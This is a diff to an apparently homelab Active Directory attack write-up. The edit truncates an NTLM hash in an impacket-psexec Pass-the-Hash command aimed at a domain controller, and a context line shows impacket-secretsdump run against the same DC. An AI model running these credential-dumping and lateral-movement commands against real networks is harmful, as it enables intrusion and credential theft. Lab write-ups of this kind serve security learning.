@@ -281,7 +281,7 @@ impacket-secretsdump n.kiriazis@dc01.homelab.local
 <p>Last but not least, use a technique such as Pass-the-Hash with Impacket's psexec or wmiexec to connect remotely to the Domain Controller (DC):</p>
 
 ```
-impacket-psexec administrator@dc01.homelab.local -dc-ip 192.168.242.179 -hashes :07fadc7e00643f5733e6c4449b2cf3e1
+impacket-psexec administrator@dc01.homelab.local -dc-ip 192.168.242.179 -hashes :07fadc7e00643f5733e6c4449...
 ```
 
 <img src="/assets/img/post-img/18-05-2024/Pass-The-Hash.png" class="post-images" alt="Pass-The-Hash">
